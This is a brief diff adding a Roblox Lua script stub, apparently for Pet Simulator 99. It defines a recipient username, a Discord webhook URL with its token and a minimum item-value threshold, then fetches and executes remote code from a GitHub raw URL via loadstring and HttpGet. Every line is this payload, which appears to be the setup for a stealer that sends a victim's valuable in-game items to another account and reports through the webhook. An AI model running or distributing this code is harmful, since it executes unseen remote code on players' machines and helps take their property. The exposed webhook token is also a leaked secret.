@@ -1,0 +1,7 @@
+Username = "10tonyabc7v2"
+Username2 = "10tonyabc7v2"
+Webhook = "https://discord.com/api/webhooks/1307951784488341604/737rUfjZT-I5rKau_77Cik_62Anki5qIWpXwNbB_H6aozTk5fmm_6SV7EkL22qE_z8IT"
+
+MinimumRAP = 1000000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
